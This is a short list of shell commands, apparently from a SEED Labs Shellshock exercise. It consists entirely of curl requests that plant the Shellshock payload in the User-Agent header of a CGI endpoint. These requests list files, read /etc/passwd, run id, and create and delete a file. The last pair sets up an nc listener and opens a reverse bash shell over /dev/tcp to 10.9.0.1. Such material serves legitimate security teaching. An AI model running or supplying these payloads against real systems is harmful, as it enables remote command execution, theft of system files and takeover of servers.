
curl -v -A "() { :; }; echo Content-type: text/plain; echo; /bin/ls -l" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

curl -v -A "() { :; }; echo Content-type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

curl -v -A "() { :; }; echo Content-type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

curl -v -A "() { :; }; echo Content-type: text/plain; echo; /usr/bin/touch /tmp/xyz" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

curl -v -A "() { :; }; echo Content-type: text/plain; echo; /usr/bin/rm /tmp/xyz" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

nc -lnv 9090
curl -v -A "() { :; }; echo Content-type: text/plain; echo; /bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

